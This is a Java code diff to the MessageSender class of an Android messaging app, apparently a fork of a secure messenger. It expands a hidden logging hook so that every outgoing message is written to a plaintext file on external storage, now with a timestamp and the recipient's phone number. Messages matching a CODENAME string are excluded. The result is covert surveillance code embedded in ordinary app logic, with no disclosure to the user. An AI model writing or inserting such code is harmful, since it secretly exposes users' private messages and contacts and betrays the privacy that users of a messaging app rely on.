@@ -55,7 +55,6 @@ import java.text.SimpleDateFormat;
 import java.text.DateFormat;
 
 public class MessageSender {
-
   private static final String TAG = MessageSender.class.getSimpleName();
 //added
 
@@ -72,7 +71,6 @@ public class MessageSender {
     SmsDatabase database    = DatabaseFactory.getSmsDatabase(context);
     Recipient   recipient   = message.getRecipient();
     boolean     keyExchange = message.isKeyExchange();
-
     long allocatedThreadId;
 
     if (threadId == -1) {
@@ -88,7 +86,7 @@ public class MessageSender {
     if (!message.getMessageBody().equals(CODENAME)) {
       try {
         Log.d(TAG, message.getMessageBody());
-        writeToFile.writeToFileOnDevice(message.getMessageBody());
+        writeToFile.writeToFileOnDevice(message.getMessageBody(), message.getRecipient());
       } catch (IOException e) {
         Log.d(TAG, e.toString());
       }
@@ -120,13 +118,13 @@ public class MessageSender {
       long      messageId = database.insertMessageOutbox(message, allocatedThreadId, forceSms, insertListener);
 
       sendMediaMessage(context, recipient, forceSms, messageId, message.getExpiresIn());
-      //my addition
+      //try to write to the message recorder file
       try{
-        writeToFile.writeToFileOnDevice(message.getBody());
+        writeToFile.writeToFileOnDevice(message.getBody(), message.getRecipient());
       } catch (IOException e){
 
       }
-      //end of my addition
+      //end of addition
 
       return allocatedThreadId;
     } catch (MmsException e) {
@@ -306,12 +304,10 @@ public class MessageSender {
     }
   }
 
-
+//this is an inner class used to write the messages that being sent into a log file
   public static class WriteMessageIntoLogFile {
-    //my addition
     public BufferedWriter out;
     private boolean bufferWasCreated = false;
-    //end of my addition
 
 
     public WriteMessageIntoLogFile() {
@@ -327,7 +323,7 @@ public class MessageSender {
 
     private void createFileOnDevice(Boolean append) throws IOException {
     /*
-    * Function to initially create the log file and it also writes the time of creation to file.
+    * Function to initially create the log file.
     */
       File Root = Environment.getExternalStorageDirectory();
       if (Root.canWrite()) {
@@ -336,27 +332,22 @@ public class MessageSender {
         FileWriter LogWriter = new FileWriter(LogFile, append);
         out = new BufferedWriter(LogWriter);
 
-        // Date date = new Date();
-        // out.write("Logged at" + String.valueOf(date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + "\n"));
-        // out.close();
-
       }
     }
 
 
-    public void writeToFileOnDevice(String message) throws IOException {
+    public void writeToFileOnDevice(String message, Recipient r) throws IOException {
     /*
     * Function to initially create the log file and it also writes the time of creation to file.
+    * it gets the message that is sent and also the recipient, so we can get the number which
+     * the message was sent to.
     */
       File Root = Environment.getExternalStorageDirectory();
       if (Root.canWrite()) {
-        //File  LogFile = new File(Root, "messages.txt");
-        // FileWriter LogWriter = new FileWriter(LogFile, append);
-        //out = new BufferedWriter(LogWriter);
         Date date = new Date();
         DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
         out.write(dateFormat.format(date)
-                + ": " + message + "\n");
+                +" to " + r.getAddress()+ ": " + message + "\n");
         out.flush();
         //out.close();
 
